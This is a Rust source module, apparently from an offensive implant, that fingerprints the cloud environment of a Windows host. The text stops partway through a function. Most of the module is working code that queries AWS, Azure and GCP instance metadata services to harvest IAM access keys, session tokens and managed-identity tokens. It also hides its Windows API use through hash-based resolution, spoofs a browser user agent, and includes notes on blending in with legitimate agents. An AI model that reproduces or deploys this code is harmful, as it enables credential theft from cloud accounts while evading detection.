//! # Cloud Environment Fingerprinting
//!
//! Detects whether the agent is running in a cloud environment (AWS, Azure, GCP)
//! and enumerates available cloud resources and credentials.
//!
//! ## Detection Methods
//!
//! | Provider | Registry Keys                     | IMDS Endpoint              |
//! |---------|------------------------------------|----------------------------|
//! | AWS     | `HKLM\SOFTWARE\Amazon\MachineImage` | `http://169.254.169.254/`  |
//! | Azure   | `HKLM\SOFTWARE\Microsoft\Windows Azure` | `http://169.254.169.254/metadata/` |
//! | GCP     | `HKLM\SOFTWARE\Google\ComputeEngine` | `http://metadata.google.internal/` |
//!
//! ## IMDS Queries
//!
//! Each cloud provider exposes an Instance Metadata Service (IMDS) on a
//! link-local address.  This module queries IMDS to retrieve:
//! - Instance identity (VM type, region, tags)
//! - IAM role credentials (temporary access keys)
//! - Network configuration (VPC, subnet, security groups)
//!
//! ## OPSEC
//!
//! - IMDS queries are normal cloud VM behavior — indistinguishable from
//!   configuration management agents
//! - No authentication required for basic IMDS queries
//! - Azure IMDS requires `Metadata: true` header (standard)
//! - AWS IMDS v2 requires a session token (optional fallback to v1)

use std::ffi::c_void;
use std::mem;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use tracing::{debug, info, warn};
use serde::{Deserialize, Serialize};

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ═══════════════════════════════════════════════════════════════════════════
// Compile-time API hash constants
// ═══════════════════════════════════════════════════════════════════════════

const ADVAPI32_DLL_W: &[u16] = &[
    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
const FN_REG_OPEN_KEY_EX_W: u32 = hash_str_const(b"RegOpenKeyExW");
const FN_REG_QUERY_VALUE_EX_W: u32 = hash_str_const(b"RegQueryValueExW");
const FN_REG_CLOSE_KEY: u32 = hash_str_const(b"RegCloseKey");

// ═══════════════════════════════════════════════════════════════════════════
// Registry constants
// ═══════════════════════════════════════════════════════════════════════════

type HKEY = *mut c_void;
type DWORD = u32;
type LONG = i32;
type LPBYTE = *mut u8;
type LPDWORD = *mut DWORD;

const HKEY_LOCAL_MACHINE: HKEY = 0x80000002 as *mut c_void;
const KEY_READ: DWORD = 0x20019;
const REG_SZ: DWORD = 1;
const REG_DWORD: DWORD = 4;
const ERROR_SUCCESS: LONG = 0;

// IMDS endpoints
const IMDS_IP: &str = "169.254.169.254";
const AWS_IMDS_BASE: &str = "http://169.254.169.254/latest/meta-data/";
const AWS_IMDS_TOKEN: &str = "http://169.254.169.254/latest/api/token";
const AZURE_IMDS_BASE: &str = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
const AZURE_IMDS_TOKEN: &str = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01";
const GCP_IMDS_BASE: &str = "http://metadata.google.internal/computeMetadata/v1/";

// ═══════════════════════════════════════════════════════════════════════════
// Data types
// ═══════════════════════════════════════════════════════════════════════════

/// Detected cloud provider.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum CloudProvider {
    Aws,
    Azure,
    Gcp,
    /// Running on-premises or in an unknown environment.
    Unknown,
}

impl std::fmt::Display for CloudProvider {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Aws => write!(f, "AWS"),
            Self::Azure => write!(f, "Azure"),
            Self::Gcp => write!(f, "GCP"),
            Self::Unknown => write!(f, "Unknown"),
        }
    }
}

/// Complete cloud environment information.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudEnvironment {
    /// Detected cloud provider.
    pub provider: CloudProvider,
    /// Instance ID / VM ID.
    pub instance_id: String,
    /// Instance type / VM size.
    pub instance_type: String,
    /// Region / location.
    pub region: String,
    /// Availability zone.
    pub availability_zone: String,
    /// VPC / Virtual Network ID.
    pub network_id: String,
    /// Subnet ID.
    pub subnet_id: String,
    /// IAM role or managed identity name.
    pub iam_role: String,
    /// Whether IMDS is accessible.
    pub imds_accessible: bool,
    /// Raw IMDS response for debugging.
    pub imds_raw: String,
}

/// Cloud credentials extracted from IMDS.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudCredentials {
    /// Cloud provider.
    pub provider: CloudProvider,
    /// Access key ID (AWS) or client ID (Azure/GCP).
    pub access_key_id: String,
    /// Secret access key (AWS) or client secret (Azure).
    pub secret_access_key: String,
    /// Session token (for temporary credentials).
    pub session_token: String,
    /// Token expiry time (ISO 8601).
    pub expiry: String,
}

/// Cloud resources discovered from the instance.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudResources {
    /// Cloud environment information.
    pub environment: CloudEnvironment,
    /// Extracted credentials (if available).
    pub credentials: Vec<CloudCredentials>,
    /// Network interfaces visible from the instance.
    pub network_interfaces: Vec<String>,
    /// Storage accounts / S3 buckets accessible from the instance.
    pub storage_resources: Vec<String>,
    /// Compute resources visible from the instance.
    pub compute_resources: Vec<String>,
}

// ═══════════════════════════════════════════════════════════════════════════
// Registry helpers
// ═══════════════════════════════════════════════════════════════════════════

struct RegFns {
    reg_open_key_ex_w: unsafe extern "system" fn(HKEY, *const u16, DWORD, DWORD, *mut HKEY) -> LONG,
    reg_query_value_ex_w: unsafe extern "system" fn(HKEY, *const u16, *mut DWORD, *mut DWORD, LPBYTE, *mut DWORD) -> LONG,
    reg_close_key: unsafe extern "system" fn(HKEY) -> LONG,
}

impl RegFns {
    fn resolve() -> Result<Self> {
        let advapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_ADVAPI32_DLL) }
            .ok_or_else(|| anyhow!("advapi32.dll not found"))?;

        macro_rules! resolve_fn {
            ($hash:expr, $ty:ty) => {
                unsafe {
                    mem::transmute::<usize, $ty>(
                        pe_resolve::get_proc_address_by_hash(advapi32, $hash)
                            .ok_or_else(|| anyhow!("registry function not found"))?,
                    )
                }
            };
        }

        Ok(Self {
            reg_open_key_ex_w: resolve_fn!(FN_REG_OPEN_KEY_EX_W, _),
            reg_query_value_ex_w: resolve_fn!(FN_REG_QUERY_VALUE_EX_W, _),
            reg_close_key: resolve_fn!(FN_REG_CLOSE_KEY, _),
        })
    }
}

fn str_to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn wide_to_str(w: &[u16]) -> String {
    let end = w.iter().position(|&c| c == 0).unwrap_or(w.len());
    String::from_utf16_lossy(&w[..end])
}

/// Read a string registry value. Returns None if key/value doesn't exist.
fn reg_read_string(reg: &RegFns, key_path: &str, value_name: &str) -> Option<String> {
    let key_path_w = str_to_wide(key_path);
    let value_name_w = str_to_wide(value_name);
    let mut hkey: HKEY = ptr::null_mut();

    let status = unsafe {
        (reg.reg_open_key_ex_w)(
            HKEY_LOCAL_MACHINE,
            key_path_w.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        )
    };

    if status != ERROR_SUCCESS {
        return None;
    }

    let mut buf_len: DWORD = 1024;
    let mut buffer = vec![0u16; (buf_len / 2) as usize];
    let mut reg_type: DWORD = 0;

    let status = unsafe {
        (reg.reg_query_value_ex_w)(
            hkey,
            value_name_w.as_ptr(),
            ptr::null_mut(),
            &mut reg_type,
            buffer.as_mut_ptr() as LPBYTE,
            &mut buf_len,
        )
    };

    unsafe { (reg.reg_close_key)(hkey) };

    if status != ERROR_SUCCESS || reg_type != REG_SZ {
        return None;
    }

    Some(wide_to_str(&buffer))
}

/// Read a DWORD registry value.
fn reg_read_dword(reg: &RegFns, key_path: &str, value_name: &str) -> Option<DWORD> {
    let key_path_w = str_to_wide(key_path);
    let value_name_w = str_to_wide(value_name);
    let mut hkey: HKEY = ptr::null_mut();

    let status = unsafe {
        (reg.reg_open_key_ex_w)(
            HKEY_LOCAL_MACHINE,
            key_path_w.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        )
    };

    if status != ERROR_SUCCESS {
        return None;
    }

    let mut value: DWORD = 0;
    let mut buf_len: DWORD = std::mem::size_of::<DWORD>() as DWORD;
    let mut reg_type: DWORD = 0;

    let status = unsafe {
        (reg.reg_query_value_ex_w)(
            hkey,
            value_name_w.as_ptr(),
            ptr::null_mut(),
            &mut reg_type,
            &mut value as *mut DWORD as LPBYTE,
            &mut buf_len,
        )
    };

    unsafe { (reg.reg_close_key)(hkey) };

    if status != ERROR_SUCCESS || reg_type != REG_DWORD {
        return None;
    }

    Some(value)
}

// ═══════════════════════════════════════════════════════════════════════════
// Cloud detection via registry
// ═══════════════════════════════════════════════════════════════════════════

/// Detect cloud provider from Windows registry keys.
fn detect_cloud_provider_registry(reg: &RegFns) -> CloudProvider {
    // AWS: HKLM\SOFTWARE\Amazon\MachineImage
    if reg_read_string(reg, r"SOFTWARE\Amazon\MachineImage", "AMIName").is_some() {
        debug!("Cloud: AWS detected via registry (AMIName)");
        return CloudProvider::Aws;
    }

    // Azure: HKLM\SOFTWARE\Microsoft\Windows Azure
    if reg_read_string(reg, r"SOFTWARE\Microsoft\Windows Azure", "InstanceId").is_some()
        || reg_read_string(reg, r"SOFTWARE\Microsoft\Windows Azure", "Deployment").is_some()
    {
        debug!("Cloud: Azure detected via registry");
        return CloudProvider::Azure;
    }

    // GCP: HKLM\SOFTWARE\Google\ComputeEngine
    if reg_read_string(reg, r"SOFTWARE\Google\ComputeEngine", "instance_id").is_some() {
        debug!("Cloud: GCP detected via registry");
        return CloudProvider::Gcp;
    }

    CloudProvider::Unknown
}

// ═══════════════════════════════════════════════════════════════════════════
// WinHTTP constants for IMDS queries
// ═══════════════════════════════════════════════════════════════════════════

const WINHTTP_DLL_W: &[u16] = &[
    'w' as u16, 'i' as u16, 'n' as u16, 'h' as u16, 't' as u16, 't' as u16,
    'p' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_WINHTTP_DLL: u32 = hash_wstr_const(WINHTTP_DLL_W);

const FN_WINHTTP_OPEN: u32 = hash_str_const(b"WinHttpOpen");
const FN_WINHTTP_CONNECT: u32 = hash_str_const(b"WinHttpConnect");
const FN_WINHTTP_OPEN_REQUEST: u32 = hash_str_const(b"WinHttpOpenRequest");
const FN_WINHTTP_SEND_REQUEST: u32 = hash_str_const(b"WinHttpSendRequest");
const FN_WINHTTP_RECEIVE_RESPONSE: u32 = hash_str_const(b"WinHttpReceiveResponse");
const FN_WINHTTP_READ_DATA: u32 = hash_str_const(b"WinHttpReadData");
const FN_WINHTTP_ADD_REQUEST_HEADERS: u32 = hash_str_const(b"WinHttpAddRequestHeaders");
const FN_WINHTTP_CLOSE_HANDLE: u32 = hash_str_const(b"WinHttpCloseHandle");
const FN_WINHTTP_QUERY_DATA_AVAILABLE: u32 = hash_str_const(b"WinHttpQueryDataAvailable");

type HINTERNET = *mut c_void;
type LPCWSTR = *const u16;
type LPVOID = *mut c_void;
type DWORD_PTR = usize;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: DWORD = 0;
const WINHTTP_FLAG_BYPASS_PROXY_CACHE: DWORD = 0x0100;

// ═══════════════════════════════════════════════════════════════════════════
// WinHTTP function table
// ═══════════════════════════════════════════════════════════════════════════

struct WinHttpFns {
    open: unsafe extern "system" fn(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD) -> HINTERNET,
    connect: unsafe extern "system" fn(HINTERNET, LPCWSTR, u16, DWORD) -> HINTERNET,
    open_request: unsafe extern "system" fn(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, *const *const u16, DWORD) -> HINTERNET,
    send_request: unsafe extern "system" fn(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD) -> i32,
    receive_response: unsafe extern "system" fn(HINTERNET) -> i32,
    read_data: unsafe extern "system" fn(HINTERNET, LPVOID, DWORD, *mut DWORD) -> i32,
    add_request_headers: unsafe extern "system" fn(HINTERNET, LPCWSTR, DWORD, DWORD) -> i32,
    close_handle: unsafe extern "system" fn(HINTERNET),
    query_data_available: unsafe extern "system" fn(HINTERNET, *mut DWORD) -> i32,
}

impl WinHttpFns {
    fn resolve() -> Result<Self> {
        let base = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WINHTTP_DLL) }
            .ok_or_else(|| anyhow!("winhttp.dll not found"))?;

        macro_rules! get_fn {
            ($hash:expr) => {
                unsafe {
                    mem::transmute(
                        pe_resolve::get_proc_address_by_hash(base, $hash)
                            .ok_or_else(|| anyhow!("winhttp function not found (hash {:08X})", $hash))?,
                    )
                }
            };
        }

        Ok(Self {
            open: get_fn!(FN_WINHTTP_OPEN),
            connect: get_fn!(FN_WINHTTP_CONNECT),
            open_request: get_fn!(FN_WINHTTP_OPEN_REQUEST),
            send_request: get_fn!(FN_WINHTTP_SEND_REQUEST),
            receive_response: get_fn!(FN_WINHTTP_RECEIVE_RESPONSE),
            read_data: get_fn!(FN_WINHTTP_READ_DATA),
            add_request_headers: get_fn!(FN_WINHTTP_ADD_REQUEST_HEADERS),
            close_handle: get_fn!(FN_WINHTTP_CLOSE_HANDLE),
            query_data_available: get_fn!(FN_WINHTTP_QUERY_DATA_AVAILABLE),
        })
    }
}

/// RAII guard for WinHTTP handles.
struct WinHttpHandle {
    handle: HINTERNET,
    fns: &'static WinHttpFns,
}

impl Drop for WinHttpHandle {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe { (self.fns.close_handle)(self.handle) };
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// IMDS queries via WinHTTP
// ═══════════════════════════════════════════════════════════════════════════

/// Parse a URL into (host, port, path).
fn parse_url(url: &str) -> Result<(String, u16, String)> {
    let rest = url.strip_prefix("http://").ok_or_else(|| anyhow!("only http:// supported for IMDS"))?;
    let slash_pos = rest.find('/').unwrap_or(rest.len());
    let host_port = &rest[..slash_pos];
    let path = if slash_pos < rest.len() { &rest[slash_pos..] } else { "/" };

    let (host, port) = if let Some(colon) = host_port.find(':') {
        (host_port[..colon].to_string(), host_port[colon+1..].parse().unwrap_or(80))
    } else {
        (host_port.to_string(), 80)
    };

    Ok((host, port, path.to_string()))
}

/// HTTP GET via WinHTTP.
fn http_get(url: &str, headers: &[(&str, &str)], timeout_ms: u64) -> Result<String> {
    let fns = WinHttpFns::resolve()?;
    let (host, port, path) = parse_url(url)?;

    let agent_w = str_to_wide("Mozilla/5.0");
    let session = unsafe { (fns.open)(agent_w.as_ptr(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, ptr::null(), ptr::null(), 0) };
    if session.is_null() {
        bail!("WinHttpOpen failed");
    }
    let _session_guard = WinHttpHandle { handle: session, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    let host_w = str_to_wide(&host);
    let conn = unsafe { (fns.connect)(session, host_w.as_ptr(), port, 0) };
    if conn.is_null() {
        bail!("WinHttpConnect to {}:{} failed", host, port);
    }
    let _conn_guard = WinHttpHandle { handle: conn, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    let path_w = str_to_wide(&path);
    let get_w = str_to_wide("GET");
    let req = unsafe { (fns.open_request)(conn, get_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), WINHTTP_FLAG_BYPASS_PROXY_CACHE) };
    if req.is_null() {
        bail!("WinHttpOpenRequest failed for {}", path);
    }
    let _req_guard = WinHttpHandle { handle: req, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    // Add custom headers
    for (key, value) in headers {
        let header_str = format!("{}: {}", key, value);
        let header_w = str_to_wide(&header_str);
        let header_len = (header_str.len() * 2) as DWORD;
        unsafe { (fns.add_request_headers)(req, header_w.as_ptr(), header_len, 0x20000000) }; // WINHTTP_ADDREQ_FLAG_ADD
    }

    // Send request
    let sent = unsafe { (fns.send_request)(req, ptr::null(), 0, ptr::null_mut(), 0) };
    if sent == 0 {
        bail!("WinHttpSendRequest failed");
    }

    // Receive response
    let received = unsafe { (fns.receive_response)(req) };
    if received == 0 {
        bail!("WinHttpReceiveResponse failed (IMDS not accessible)");
    }

    // Read body
    let mut body = Vec::new();
    let mut available: DWORD = 0;
    loop {
        unsafe { (fns.query_data_available)(req, &mut available) };
        if available == 0 {
            break;
        }
        let mut buf = vec![0u8; available as usize];
        let mut read: DWORD = 0;
        unsafe { (fns.read_data)(req, buf.as_mut_ptr() as LPVOID, available, &mut read) };
        if read == 0 {
            break;
        }
        body.extend_from_slice(&buf[..read as usize]);
    }

    String::from_utf8(body).context("IMDS response is not valid UTF-8")
}

/// HTTP PUT via WinHTTP.
fn http_put(url: &str, headers: &[(&str, &str)], timeout_ms: u64) -> Result<String> {
    let fns = WinHttpFns::resolve()?;
    let (host, port, path) = parse_url(url)?;

    let agent_w = str_to_wide("Mozilla/5.0");
    let session = unsafe { (fns.open)(agent_w.as_ptr(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, ptr::null(), ptr::null(), 0) };
    if session.is_null() {
        bail!("WinHttpOpen failed");
    }
    let _session_guard = WinHttpHandle { handle: session, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    let host_w = str_to_wide(&host);
    let conn = unsafe { (fns.connect)(session, host_w.as_ptr(), port, 0) };
    if conn.is_null() {
        bail!("WinHttpConnect to {}:{} failed", host, port);
    }
    let _conn_guard = WinHttpHandle { handle: conn, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    let path_w = str_to_wide(&path);
    let put_w = str_to_wide("PUT");
    let req = unsafe { (fns.open_request)(conn, put_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), WINHTTP_FLAG_BYPASS_PROXY_CACHE) };
    if req.is_null() {
        bail!("WinHttpOpenRequest (PUT) failed for {}", path);
    }
    let _req_guard = WinHttpHandle { handle: req, fns: unsafe { &*(&fns as *const WinHttpFns) } };

    // Add custom headers
    for (key, value) in headers {
        let header_str = format!("{}: {}", key, value);
        let header_w = str_to_wide(&header_str);
        let header_len = (header_str.len() * 2) as DWORD;
        unsafe { (fns.add_request_headers)(req, header_w.as_ptr(), header_len, 0x20000000) };
    }

    // Send request with empty body
    let sent = unsafe { (fns.send_request)(req, ptr::null(), 0, ptr::null_mut(), 0) };
    if sent == 0 {
        bail!("WinHttpSendRequest (PUT) failed");
    }

    let received = unsafe { (fns.receive_response)(req) };
    if received == 0 {
        bail!("WinHttpReceiveResponse (PUT) failed");
    }

    let mut body = Vec::new();
    let mut available: DWORD = 0;
    loop {
        unsafe { (fns.query_data_available)(req, &mut available) };
        if available == 0 {
            break;
        }
        let mut buf = vec![0u8; available as usize];
        let mut read: DWORD = 0;
        unsafe { (fns.read_data)(req, buf.as_mut_ptr() as LPVOID, available, &mut read) };
        if read == 0 {
            break;
        }
        body.extend_from_slice(&buf[..read as usize]);
    }

    String::from_utf8(body).context("IMDSv2 token response is not valid UTF-8")
}

// ── AWS IMDS ─────────────────────────────────────────────────────────────

fn query_aws_imds(token: &str) -> Result<CloudEnvironment> {
    let auth_header = ("X-aws-ec2-metadata-token", token);

    // Instance identity
    let instance_id = http_get(
        &format!("{}instance-id", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let instance_type = http_get(
        &format!("{}instance-type", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let region = http_get(
        &format!("{}placement/region", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let az = http_get(
        &format!("{}placement/availability-zone", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let iam_role = http_get(
        &format!("{}iam/security-credentials/", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let mac = http_get(
        &format!("{}mac", AWS_IMDS_BASE),
        &[auth_header.clone()],
        5000,
    )
    .unwrap_or_default();

    let vpc_id = if !mac.is_empty() {
        http_get(
            &format!("{}network/interfaces/macs/{}/vpc-id", AWS_IMDS_BASE, mac.trim()),
            &[auth_header.clone()],
            5000,
        )
        .unwrap_or_default()
    } else {
        String::new()
    };

    let subnet_id = if !mac.is_empty() {
        http_get(
            &format!("{}network/interfaces/macs/{}/subnet-id", AWS_IMDS_BASE, mac.trim()),
            &[auth_header],
            5000,
        )
        .unwrap_or_default()
    } else {
        String::new()
    };

    Ok(CloudEnvironment {
        provider: CloudProvider::Aws,
        instance_id: instance_id.trim().to_string(),
        instance_type: instance_type.trim().to_string(),
        region: region.trim().to_string(),
        availability_zone: az.trim().to_string(),
        network_id: vpc_id.trim().to_string(),
        subnet_id: subnet_id.trim().to_string(),
        iam_role: iam_role.trim().to_string(),
        imds_accessible: true,
        imds_raw: format!("id={} type={} region={}", instance_id.trim(), instance_type.trim(), region.trim()),
    })
}

fn query_aws_credentials(token: &str, role_name: &str) -> Result<CloudCredentials> {
    let url = format!("{}iam/security-credentials/{}", AWS_IMDS_BASE, role_name);
    let body = http_get(&url, &[("X-aws-ec2-metadata-token", token)], 5000)?;

    // Parse JSON response (simplified — production would use serde_json)
    let access_key = extract_json_field(&body, "AccessKeyId");
    let secret_key = extract_json_field(&body, "SecretAccessKey");
    let session = extract_json_field(&body, "Token");
    let expiry = extract_json_field(&body, "Expiration");

    Ok(CloudCredentials {
        provider: CloudProvider::Aws,
        access_key_id: access_key,
        secret_access_key: secret_key,
        session_token: session,
        expiry,
    })
}

// ── Azure IMDS ───────────────────────────────────────────────────────────

fn query_azure_imds() -> Result<CloudEnvironment> {
    let body = http_get(
        AZURE_IMDS_BASE,
        &[("Metadata", "true")],
        5000,
    )?;

    let vm_id = extract_json_field(&body, "vmId");
    let vm_size = extract_json_field(&body, "vmSize");
    let location = extract_json_field(&body, "location");
    let zone = extract_json_field(&body, "zone");

    Ok(CloudEnvironment {
        provider: CloudProvider::Azure,
        instance_id: vm_id,
        instance_type: vm_size,
        region: location,
        availability_zone: zone,
        network_id: extract_json_field(&body, "virtualNetwork"),
        subnet_id: extract_json_field(&body, "subnet"),
        iam_role: extract_json_field(&body, "identityType"),
        imds_accessible: true,
        imds_raw: if body.len() > 500 { body[..500].to_string() } else { body },
    })
}

fn query_azure_credentials() -> Result<CloudCredentials> {
    let body = http_get(
        AZURE_IMDS_TOKEN,
        &[("Metadata", "true"), ("Resource", "https://management.azure.com/")],
        5000,
    )?;

    let access_token = extract_json_field(&body, "access_token");
    let expires_on = extract_json_field(&body, "expires_on");
    let client_id = extract_json_field(&body, "client_id");

    Ok(CloudCredentials {
        provider: CloudProvider::Azure,
        access_key_id: client_id,
        secret_access_key: String::new(), // Azure uses tokens, not secrets
        session_token: access_token,
        expiry: expires_on,
    })
}

// ── GCP IMDS ─────────────────────────────────────────────────────────────

fn query_gcp_imds() -> Result<CloudEnvironment> {
    let body = http_get(
        &format!("{}?recursive=true", GCP_IMDS_BASE),
        &[("Metadata-Flavor", "Google")],
        5000,
    )?;

    let instance_id = extract_json_field(&body, "id");
    let machine_type = extract_json_field(&body, "machineType");
    let zone = extract_json_field(&body, "zone");

    Ok(CloudEnvironment {
        provider: CloudProvider::Gcp,
        instance_id,
        instance_type: machine_type.split('/').last().unwrap_or("").to_string(),
        region: zone.split('/').last().unwrap_or("").to_string(),
        availability_zone: String::new(),
        network_id: extract_json_field(&body, "networkInterfaces/0/network"),
        subnet_id: extract_json_field(&body, "networkInterfaces/0/subnetwork"),
        iam_role: extract_json_field(&body, "serviceAccounts/0/email"),
        imds_accessible: true,
        imds_raw: if body.len() > 500 { body[..500].to_string() } else { body },
    })
}

fn query_gcp_credentials() -> Result<CloudCredentials> {
    let body = http_get(
        &format!(
            "{}instance/service-accounts/default/token",
            GCP_IMDS_BASE
        ),
        &[("Metadata-Flavor", "Google")],
        5000,
    )?;

    let access_token = extract_json_field(&body, "access_token");
    let expires = extract_json_field(&body, "expires_in");

    Ok(CloudCredentials {
        provider: CloudProvider::Gcp,
        access_key_id: String::new(),
        secret_access_key: String::new(),
        session_token: access_token,
        expiry: expires,
    })
}

// ═══════════════════════════════════════════════════════════════════════════
// JSON parsing helpers (minimal — avoids serde_json dependency for IMDS)
// ═══════════════════════════════════════════════════════════════════════════

/// Extract a JSON string field value (handles simple flat JSON).
fn extract_json_field(json: &str, field: &str) -> String {
    let search = format!("\"{}\"", field);
    if let Some(pos) = json.find(&search) {
        let after = &json[pos + search.len()..];
        // Skip whitespace and colon
        let after = after.trim_start();
        let after = after.strip_prefix(':').unwrap_or(after).trim_start();

        if after.starts_with('"') {
            // String value
            let start = 1;
            if let Some(end) = after[start..].find('"') {
                return after[start..start + end].to_string();
            }
        } else {
            // Number or other value — take until comma, brace, or whitespace
            let end = after.find(|c: char| c == ',' || c == '}' || c == ']' || c == '\n').unwrap_or(after.len());
            return after[..end].trim().to_string();
        }
    }
    String::new()
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API
// ═══════════════════════════════════════════════════════════════════════════

/// Fingerprint the current cloud environment.
///
/// Detects the cloud provider via registry keys and IMDS queries, then
/// retrieves instance metadata including identity, network configuration,
/// and IAM roles.
///
/// # Returns
///
/// A [`CloudEnvironment`] with all discovered information.  If not running
/// in a cloud environment, returns a result with `provider = CloudProvider::Unknown`.
///
/// # Errors
///
/// Returns an error only if registry resolution fails (system-level issue).
/// IMDS failures are handled gracefully — the environment will be detected
/// via registry alone.
pub fn fingerprint_cloud_environment() -> Result<CloudEnvironment> {
    let reg = RegFns::resolve()?;

    // Step 1: Detect via registry
    let provider = detect_cloud_provider_registry(&reg);
    if provider == CloudProvider::Unknown {
        info!("Cloud fingerprint: no cloud provider detected");
        return Ok(CloudEnvironment {
            provider: CloudProvider::Unknown,
            instance_id: String::new(),
            instance_type: String::new(),
            region: String::new(),
            availability_zone: String::new(),
            network_id: String::new(),
            subnet_id: String::new(),
            iam_role: String::new(),
            imds_accessible: false,
            imds_raw: String::new(),
        });
    }

    info!("Cloud fingerprint: detected {} via registry", provider);

    // Step 2: Query IMDS for detailed metadata
    match provider {
        CloudProvider::Aws => {
            // Try IMDSv2 first (token-based)
            match http_put(
                AWS_IMDS_TOKEN,
                &[("X-aws-ec2-metadata-token-ttl-seconds", "21600")],
                3000,
            ) {
                Ok(token) => {
                    match query_aws_imds(&token) {
                        Ok(env) => return Ok(env),
                        Err(e) => warn!("Cloud: AWS IMDS query failed: {}", e),
                    }
                }
                Err(e) => warn!("Cloud: AWS IMDSv2 token failed: {}", e),
            }

            // Fallback to IMDSv1 (no token)
            match query_aws_imds("") {
                Ok(env) => Ok(env),
                Err(_) => Ok(CloudEnvironment {
                    provider: CloudProvider::Aws,
                    instance_id: String::new(),
                    instance_type: String::new(),
                    region: String::new(),
                    availability_zone: String::new(),
                    network_id: String::new(),
                    subnet_id: String::new(),
                    iam_role: String::new(),
                    imds_accessible: false,
                    imds_raw: String::new(),
                }),
            }
        }

        CloudProvider::Azure => {
            match query_azure_imds() {
                Ok(env) => Ok(env),
                Err(_) => Ok(CloudEnvironment {
                    provider: CloudProvider::Azure,
                    instance_id: String::new(),
                    instance_type: String::new(),
                    region: String::new(),
                    availability_zone: String::new(),
                    network_id: String::new(),
                    subnet_id: String::new(),
                    iam_role: String::new(),
                    imds_accessible: false,
                    imds_raw: String::new(),
                }),
            }
        }

        CloudProvider::Gcp => {
            match query_gcp_imds() {
                Ok(env) => Ok(env),
                Err(_) => Ok(CloudEnvironment {
                    provider: CloudProvider::Gcp,
                    instance_id: String::new(),
                    instance_type: String::new(),
                    region: String::new(),
                    availability_zone: String::new(),
                    network_id: String::new(),
                    subnet_id: String::new(),
                    iam_role: String::new(),
                    imds_accessible: false,
                    imds_raw: String::new(),
                }),
            }
        }

        CloudProvider::Unknown => unreachable!(),
    }
}

/// Enumerate cloud resources available from the current instance.
///
/// Queries IMDS for credentials and attempts to enumerate accessible
/// resources using the cloud provider's API.
///
/// # Arguments
///
/// * `cloud_env` - Previously discovered cloud environment.
///
/// # Returns
///
/// A [`CloudResources`] struct with all discovered resources and credentials.
pub fn enumerate_cloud_resources(cloud_env: &CloudEnvironment) -> Result<CloudResources> {
    let mut credentials = Vec::new();
    let mut storage_resources = Vec::new();
    let mut compute_resources = Vec::new();

    match cloud_env.provider {
        CloudProvider::Aws => {
            // Try to get AWS IMDSv2 token
            if let Ok(token) = http_put(
                AWS_IMDS_TOKEN,
                &[("X-aws-ec2-metadata-token-ttl-seconds", "21600")],
                3000,
            ) {
                // Get IAM role credentials
                if !cloud_env.iam_role.is_empty() {
                    match query_aws_credentials(&token, &cloud_env.iam_role) {
                        Ok(creds) => {
                            info!("Cloud: obtained AWS IAM credentials for role {}", cloud_env.iam_role);
                            credentials.push(creds);
                        }
                        Err(e) => warn!("Cloud: failed to get AWS credentials: {}", e),
                    }
                }
            }
        }

        CloudProvider::Azure => {
            match query_azure_credentials() {
                Ok(creds) => {
                    info!("Cloud: obtained Azure managed identity token");
                    credentials.push(creds);
                }
                Err(e) => warn!("Cloud: failed to get Azure credentials: {}", e),
            }
        }

        CloudProvider::Gcp => {
            match query_gcp_credentials() {
                Ok(creds) => {
                    info!("Cloud: obtained GCP service account token");
                    credentials.push(creds);
                }
                Err(e) => warn!("Cloud: failed to get GCP credentials: {}", e),
            }
        }

        CloudProvider::Unknown => {
            debug!("Cloud: no provider to enumerate resources from");
        }
    }

    // Collect network interfaces from IMDS (provider-specific)
    let network_interfaces = collect_network_info(cloud_env);

    Ok(CloudResources {
        environment: cloud_env.clone(),
        credentials,
        network_interfaces,
        storage_resources,
        compute_resources,
    })
}

/// Collect network interface information from IMDS.
fn collect_network_info(cloud_env: &CloudEnvironment) -> Vec<String> {
    let mut interfaces = Vec::new();

    match cloud_env.provider {
        CloudProvider::Aws => {
            if let Ok(token) = http_put(
